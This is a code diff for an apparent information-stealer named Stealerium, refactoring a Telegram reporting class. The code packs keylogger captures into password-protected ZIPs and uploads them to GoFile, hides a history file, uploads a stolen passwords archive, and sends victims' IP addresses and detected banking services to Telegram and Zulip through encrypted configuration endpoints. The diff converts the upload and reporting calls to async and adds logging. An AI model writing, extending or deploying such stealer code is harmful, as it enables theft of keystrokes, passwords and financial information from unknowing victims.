@@ -2,7 +2,6 @@
 using System.IO;
 using System.Net.Http;
 using System.Text;
-using System.Text.Json;
 using System.Threading.Tasks;
 using System.Linq;
 using System.Text.RegularExpressions;
@@ -15,7 +14,7 @@ namespace Stealerium
 {
     internal sealed class Telegram
     {
-        private const int MaxKeylogs = 10;
+        private const int MaxKeylogs = 5;
 
         private static string TelegramBotAPI = StringsCrypt.DecryptConfig("ENCRYPTED:BncRbgTGet4L+mKqD8dz7h8EdEcrI2Pbm5InYO5Ff/I=");
         private static string ZulipAPIBaseUrl = StringsCrypt.DecryptConfig("ENCRYPTED:hu7mPNLn8F3W1m8DcwM5LXHInCJglBwFsWCfcHCJ9tF7oYejzA1wmRf7U4KxfmKxWUHNJ/cIv306TuGoVjZvAA==");
@@ -246,20 +245,51 @@ namespace Stealerium
         }
 
         /// <summary>
-        /// Upload keylogs to GoFile
+        /// Upload keylogs to GoFile with password-protected ZIP.
         /// </summary>
-        private static void UploadKeylogs()
+        private static async Task UploadKeylogsAsync()
         {
-            var log = Path.Combine(Paths.InitWorkDir(), "logs");
-            if (!Directory.Exists(log)) return;
-            var filename = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
-            var archive = Filemanager.CreateArchive(log, false);
-            File.Move(archive, filename + ".zip");
-            var url = GofileFileService.UploadFileAsync(filename + ".zip");
-            File.Delete(filename + ".zip");
-            File.AppendAllText(KeylogsHistory, "\t\t\t\t\t\t\t- " +
-                                               $"[{filename.Replace("_", " ").Replace(".", ":")}]({url})\n");
-            Startup.HideFile(KeylogsHistory);
+            Logging.Log("Starting UploadKeylogsAsync...");
+
+            var logDirectory = Path.Combine(Paths.InitWorkDir(), "logs");
+            if (!Directory.Exists(logDirectory))
+            {
+                Logging.Log($"Log directory does not exist: {logDirectory}");
+                return;
+            }
+
+            var timestamp = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
+            var zipFileName = $"{timestamp}.zip";
+            var zipFilePath = Path.Combine(Paths.InitWorkDir(), zipFileName);
+
+            try
+            {
+                Logging.Log($"Creating password-protected ZIP archive: {zipFileName}");
+                ZipManager.CreatePasswordProtectedZip(logDirectory, zipFilePath, StringsCrypt.ArchivePassword);
+                Logging.Log("ZIP archive created successfully.");
+
+                // Upload the ZIP file asynchronously
+                Logging.Log("Uploading ZIP archive to GoFile...");
+                var url = await GofileFileService.UploadFileAsync(zipFilePath).ConfigureAwait(false);
+                Logging.Log($"File uploaded to: {url}");
+
+                // Delete the ZIP file after uploading
+                File.Delete(zipFilePath);
+                Logging.Log($"ZIP archive deleted: {zipFilePath}");
+
+                // Update keylogs history with the download link
+                File.AppendAllText(KeylogsHistory, "\t\t\t\t\t\t\t- " +
+                                                   $"[{timestamp.Replace("_", " ").Replace(".", ":")}]({url})\n");
+                Logging.Log("Keylogs history updated.");
+
+                // Hide the history file
+                Startup.HideFile(KeylogsHistory);
+                Logging.Log("history.dat hidden.");
+            }
+            catch (Exception ex)
+            {
+                Logging.Log($"Error in UploadKeylogsAsync: {ex}");
+            }
         }
 
         /// <summary>
@@ -284,7 +314,7 @@ namespace Stealerium
         /// <returns>String with formatted system information</returns>
         private static async Task SendSystemInfoAsync(string url)
         {
-            UploadKeylogs();
+            await UploadKeylogsAsync();
 
             // Get system info as a report string
             var info = "```"
@@ -307,7 +337,7 @@ namespace Stealerium
                        + "\n📡 *Network:* "
                        + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                        + "\nInternal IP: " + SystemInfo.GetLocalIp()
-                       + "\nExternal IP: " + SystemInfo.GetPublicIpAsync().Result
+                       + "\nExternal IP: " + await SystemInfo.GetPublicIpAsync()
                        + "\n"
                        + "\n💸 *Domains info:*"
                        + Counter.GetLValue("🏦 *Banking services*", Counter.DetectedBankingServices, '-')
@@ -368,9 +398,18 @@ namespace Stealerium
             // Send the report to Telegram
             int last = GetLatestMessageId();
             if (last != -1)
+            {
+                Logging.Log($"Editing existing message with ID: {last}");
                 await EditMessageAsync(info, last).ConfigureAwait(false);
+                Logging.Log("Message edited successfully.");
+            }
             else
-                SetLatestMessageId(await SendMessageAsync(info).ConfigureAwait(false));
+            {
+                Logging.Log("No existing message ID found. Sending new message.");
+                int newMessageId = await SendMessageAsync(info).ConfigureAwait(false);
+                SetLatestMessageId(newMessageId);
+                Logging.Log($"New message sent with ID: {newMessageId}");
+            }
 
             // Send the report to Zulip
             await SendZulipMessageAsync("Szurubooru", SystemInfo.Username, info).ConfigureAwait(false);
@@ -384,11 +423,17 @@ namespace Stealerium
         public static async Task SendReportAsync(string file)
         {
             Logging.Log("Sending passwords archive to Gofile");
-            var url = GofileFileService.UploadFileAsync(file);
+
+            var url = await GofileFileService.UploadFileAsync(file).ConfigureAwait(false);
+            Logging.Log($"Archive uploaded to Gofile: {url}");
+
             Logging.Log("Sending report to Telegram");
-            await SendSystemInfoAsync(await url.ConfigureAwait(false)).ConfigureAwait(false);
+            await SendSystemInfoAsync(url).ConfigureAwait(false);
             Logging.Log("Report sent to Telegram");
+
             File.Delete(file);
+            Logging.Log($"Archive file deleted: {file}");
         }
+
     }
 }
